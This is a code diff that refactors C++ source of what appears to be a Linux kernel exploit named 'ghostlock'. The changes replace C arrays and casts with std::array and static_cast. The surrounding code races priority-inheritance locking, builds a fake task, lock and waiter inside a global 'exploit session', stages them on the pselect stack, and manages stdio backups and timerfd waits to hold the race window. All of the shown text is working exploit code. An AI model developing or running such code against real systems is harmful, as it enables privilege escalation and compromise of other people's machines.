@@ -11,14 +11,13 @@ namespace ghostlock::route::select_stack {
         race::PiRace *race_context, const memory::WriteRequest *route_request,
         const profile::TargetProfile &profile_value,
         profile::SelectStackLayout route_layout,
-        const int32_t stdio_backup_value[3]) noexcept
+        const std::array<int32_t, 3> &stdio_backup_value) noexcept
         : race(race_context),
           request(route_request),
           profile(profile_value),
           layout(route_layout) {
-        for (int32_t fd = 0; fd < 3; fd++) {
-            stdio_backup[fd] =
-                    support::BorrowedFd(stdio_backup_value ? stdio_backup_value[fd] : -1);
+        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
+            stdio_backup[fd] = support::BorrowedFd(stdio_backup_value[fd]);
         }
         /* The C version memset the whole context; zero the sets explicitly so a
    * destroy() before prepare() never tests uninitialized bits. */
@@ -55,7 +54,7 @@ namespace ghostlock::route::select_stack {
           select_result(other.select_result),
           select_errno(other.select_errno),
           status(other.status) {
-        for (int32_t fd = 0; fd < 3; fd++) {
+        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
             stdio_backup[fd] = other.stdio_backup[fd];
         }
     }
@@ -93,8 +92,9 @@ namespace ghostlock::route::select_stack {
     }
 
     void SelectStackRoute::destroy() noexcept {
-        for (int32_t fd = 0; fd < 3; fd++) {
-            if (stdio_backup[fd].valid()) dup2(stdio_backup[fd].get(), fd);
+        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
+            if (stdio_backup[fd].valid())
+                dup2(stdio_backup[fd].get(), static_cast<int32_t>(fd));
         }
         if (consumer_stuck) {
             (void) fail(34, select_errno);
@@ -178,16 +178,16 @@ namespace ghostlock::route {
      * first attempt. The ladder stays native-side until a Select device can
      * validate a schema extension. */
         const int32_t seed = context->profile.select_enter_delay_us();
-        static const int32_t delays[] = {
+        static constexpr std::array<int32_t, 8> delays = {
             50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
         };
-        const int32_t ladder = delays[(attempt - 1) % 8];
+        const int32_t ladder = delays[static_cast<size_t>((attempt - 1) % 8)];
         return attempt == 1 && seed > 0 ? seed : ladder;
     }
 
     void fdset_put_word(fd_set *set, int32_t word, uint64_t value) {
         unsigned long *bits = reinterpret_cast<unsigned long *>(set);
-        bits[word] = (unsigned long) value;
+        bits[word] = static_cast<unsigned long>(value);
     }
 
     uint64_t fdset_get_word(const fd_set *set, int32_t word) {
@@ -196,7 +196,7 @@ namespace ghostlock::route {
     }
 
     static int32_t pselect_words_per_set(void) {
-        int32_t bits_per_word = (int32_t) (8 * sizeof(unsigned long));
+        int32_t bits_per_word = static_cast<int32_t>(8 * sizeof(unsigned long));
         return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
     }
 
@@ -265,24 +265,24 @@ namespace ghostlock::route {
         FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
     }
 
-    static int32_t standard_io_backup[3] = {-1, -1, -1};
+    static std::array<int32_t, 3> standard_io_backup = {-1, -1, -1};
 
     void reserve_standard_io(void) {
-        for (int32_t fd = 0; fd < 3; fd++) {
-            if (standard_io_backup[fd] >= 0) continue;
+        for (int32_t fd = 0; fd < static_cast<int32_t>(standard_io_backup.size()); fd++) {
+            if (standard_io_backup[static_cast<size_t>(fd)] >= 0) continue;
             int32_t backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
             if (backup < 0) {
                 pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
             } else {
-                standard_io_backup[fd] = backup;
+                standard_io_backup[static_cast<size_t>(fd)] = backup;
             }
         }
     }
 
-    static void restore_standard_io(const support::BorrowedFd backup[3]) {
-        for (int32_t fd = 0; fd < 3; fd++) {
+    static void restore_standard_io(const std::array<support::BorrowedFd, 3> &backup) {
+        for (size_t fd = 0; fd < backup.size(); fd++) {
             if (!backup[fd].valid()) continue;
-            dup2(backup[fd].get(), fd);
+            dup2(backup[fd].get(), static_cast<int32_t>(fd));
         }
     }
 
@@ -317,7 +317,7 @@ namespace ghostlock::route {
                 {7, request->target, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                 {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {10, ((uint64_t) kernel::FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
+                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
             };
@@ -372,7 +372,7 @@ namespace ghostlock::route::select_stack {
 
         /* Both routes park on a never-ready timerfd: the waiter must stay stale
      * on the pselect stack for the whole consumer window. */
-        block.reset((int32_t) syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC));
+        block.reset(static_cast<int32_t>(syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC)));
         if (!block.valid()) {
             pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                        errno);
